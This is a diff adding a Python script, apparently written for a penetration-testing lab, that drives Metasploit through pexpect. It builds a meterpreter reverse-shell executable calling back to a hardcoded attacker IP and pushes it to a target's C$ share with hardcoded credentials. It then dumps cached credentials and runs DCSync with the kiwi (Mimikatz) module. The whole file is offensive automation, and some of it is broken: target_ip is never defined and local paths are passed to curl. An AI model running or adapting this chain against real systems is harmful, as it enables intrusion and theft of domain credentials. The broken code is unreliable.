@@ -1,0 +1,154 @@
+import os
+import pexpect
+import logging
+
+METASPLOIT_PATH = '/usr/share/metasploit-framework'
+RESOURCE_SCRIPTS = [
+    '~/resource1.rc',
+    '~/resource2.rc',
+    '~/resource3.rc',
+    '~/resource4.rc',
+    '~/resource5.rc'
+]
+
+ATTACKER_IP = '172.22.117.100'
+LOG_FILE = 'exploit_log.txt'
+
+# Configure logging
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def execute_command(command, process):
+    process.sendline(command)
+    process.expect('msf6 > ')
+
+def download_resource_scripts(process):
+    for script in RESOURCE_SCRIPTS:
+        command = f'curl -O {script}'
+        execute_command(command, process)
+
+def generate_msfshell_exe(process):
+    msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe > msfshell.exe'
+    execute_command(msfvenom_command, process)
+
+def handle_meterpreter_session(process):
+    while True:
+        command = input("Enter a command ('leave' to return to script execution): ")
+        if command == 'leave':
+            break
+        execute_command(command, process)
+
+def log_info(message):
+    logging.info(message)
+    print(message)
+
+def log_error(message):
+    logging.error(message)
+    print(f'[ERROR] {message}')
+
+def main():
+    try:
+        process = pexpect.spawn(f'{METASPLOIT_PATH}/msfconsole')
+        process.expect('msf6 > ')
+
+        # Download resource scripts
+        log_info('Downloading resource scripts...')
+        download_resource_scripts(process)
+
+        # Generate msfshell.exe
+        log_info('Generating msfshell.exe...')
+        generate_msfshell_exe(process)
+
+        # Handle meterpreter session
+        log_info('Handling meterpreter session...')
+        handle_meterpreter_session(process)
+
+        # Execute resource1.rc
+        log_info('Executing resource1.rc...')
+        execute_command(f'resource ~/resource1.rc', process)
+
+        # SMBClient section
+        log_info('Handling SMBClient session...')
+        smb_command = f'smbclient //{target_ip}/C$ -U megacorpone/tstark -c "password=Password!; put msfshell.exe; exit"'
+        execute_command(smb_command, process)
+
+        # Execute resource2.rc
+        log_info('Executing resource2.rc...')
+        execute_command(f'resource ~/resource2.rc', process)
+
+        # Background resulting meterpreter session
+        log_info('Backgrounding meterpreter session...')
+        execute_command('background', process)
+
+        # Execute resource3.rc
+        log_info('Executing resource3.rc...')
+        execute_command(f'resource ~/resource3.rc', process)
+
+        # Enter "shell" in resulting meterpreter session
+        log_info('Entering "shell" in meterpreter session...')
+        execute_command('shell', process)
+
+        # Execute "schtasks" command
+        log_info('Executing "schtasks" command...')
+        execute_command('schtasks', process)
+
+        # Exit shell to meterpreter
+        log_info('Exiting shell to meterpreter...')
+        execute_command('exit', process)
+
+        # Exit meterpreter
+        log_info('Exiting meterpreter session...')
+        execute_command('exit', process)
+
+        # Execute resource4.rc
+        log_info('Executing resource4.rc...')
+        execute_command(f'resource ~/resource4.rc', process)
+
+        # Load kiwi
+        log_info('Loading kiwi...')
+        execute_command('load kiwi', process)
+
+        # Use kiwi command kiwi_cmd lsadump::cache
+        log_info('Executing kiwi command "kiwi_cmd lsadump::cache"...')
+        execute_command('kiwi_cmd lsadump::cache', process)
+
+        # Exit meterpreter
+        log_info('Exiting meterpreter session...')
+        execute_command('exit', process)
+
+        # Execute resource5.rc
+        log_info('Executing resource5.rc...')
+        execute_command(f'resource ~/resource5.rc', process)
+
+        # Enter command "sysinfo"
+        log_info('Entering "sysinfo" command...')
+        execute_command('sysinfo', process)
+
+        # Enter command "shell"
+        log_info('Entering "shell" command...')
+        execute_command('shell', process)
+
+        # Enter command "net users"
+        log_info('Entering "net users" command...')
+        execute_command('net users', process)
+
+        # Exit shell into meterpreter
+        log_info('Exiting shell into meterpreter...')
+        execute_command('exit', process)
+
+        # Load kiwi
+        log_info('Loading kiwi...')
+        execute_command('load kiwi', process)
+
+        # Enter kiwi command "dcsync_ntlm cdanvers"
+        log_info('Entering kiwi command "dcsync_ntlm cdanvers"...')
+        execute_command('dcsync_ntlm cdanvers', process)
+
+        process.sendline('exit')
+        process.expect(pexpect.EOF)
+        process.close()
+
+    except Exception as e:
+        log_error(str(e))
+
+if __name__ == "__main__":
+    main()
